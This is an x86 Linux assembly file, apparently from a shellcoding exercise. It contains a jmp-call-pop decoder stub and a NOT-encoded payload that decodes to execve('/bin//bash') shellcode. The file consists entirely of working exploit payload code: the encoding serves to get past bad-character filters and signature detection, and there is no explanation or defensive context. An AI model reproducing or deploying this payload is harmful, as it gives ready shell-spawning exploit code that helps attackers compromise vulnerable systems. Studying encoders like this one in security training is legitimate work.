; NOT-Decoder.nasm
; Author: Ravehorn

global _start

section .text

_start:

    jmp short call_decoder

decoder:
    
    pop esi
    
decode:

    cmp byte [esi], 0xaa
    je shellcode
    not byte [esi]
    inc esi
    jmp short decode

call_decoder:

    call decoder

    shellcode: db 0xce, 0x3f, 0xaf, 0x97, 0x9d, 0x9e, 0x8c, 0x97, 0x97, 0x9d, 0x96, 0x91, 0xd0, 0x97, 0xd0, 0xd0, 0xd0, 0xd0, 0x76, 0x1c, 0xaf, 0x76, 0x1d, 0xac, 0x76, 0x1e, 0x4f, 0xf4, 0x32, 0x7f, 0xaa